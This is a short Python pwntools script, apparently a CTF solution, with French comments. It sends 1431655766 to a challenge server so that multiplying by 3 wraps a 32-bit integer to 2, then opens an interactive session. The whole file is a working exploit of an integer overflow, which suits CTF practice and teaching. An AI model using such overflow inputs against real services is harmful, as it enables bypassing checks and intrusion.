#!/usr/bin/env python3
from pwn import *

context.update(arch="amd64", timeout=0.5)

p = remote("ctf.example.org", 4202)

# on cherche un int overflow qui donne 2 une fois multiplie par 3.
# donc n'importe quell valeur:
#    XX 00 00 00 02
# est valide.
# je teste dans bpython:
# >>> 0x0100000002 / 3
# 1431655766.0
# BINGO ! pas de fraction ! donc 1431655766 * 3 == 0x0100000002
# et comme on stocke dans un int, seuls les 4 bytes de poids faible sont conserves,
# du coup ca donne 0x00000002, donc 2 !
p.sendline(str(1431655766).encode())
p.interactive()
